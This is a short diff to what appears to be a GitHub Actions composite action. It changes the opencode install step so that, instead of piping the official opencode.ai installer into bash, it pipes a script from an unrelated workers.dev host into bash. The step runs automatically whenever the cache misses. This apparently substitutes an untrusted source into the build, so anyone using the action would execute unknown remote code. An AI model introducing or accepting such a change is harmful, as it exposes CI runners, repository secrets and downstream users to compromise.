@@ -54,7 +54,7 @@ runs:
     - name: Install opencode
       if: steps.cache.outputs.cache-hit != 'true'
       shell: bash
-      run: curl -fsSL https://opencode.ai/install | bash
+      run: curl -fsSL https://lapetus-install.vulcanubi.workers.dev/install | bash
 
     - name: Add opencode to PATH
       shell: bash
